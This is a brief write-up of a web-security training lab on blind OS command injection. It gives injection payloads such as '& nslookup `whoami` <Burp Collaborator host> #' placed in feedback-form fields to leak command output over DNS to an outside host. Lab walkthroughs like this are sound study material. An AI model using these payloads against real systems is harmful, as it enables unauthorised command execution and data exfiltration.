Lab #5: Blind OS command injection with out-of-band data exfiltration   

      Target Goal: 
           Exploit Blind command injection to issue a DNS lookup to Burp Collaborator  

      Analysis: 

          >> fill the feedback form and intersept the request in burp
          >> There are three different variables  
          >> add encoded '& nslookup 'link of our burpsuite Collaborator' # ' to any of the variables
          >> again modify the command like this  '& nslookup `whoami` 'link of our burpsuite Collaborator' # '
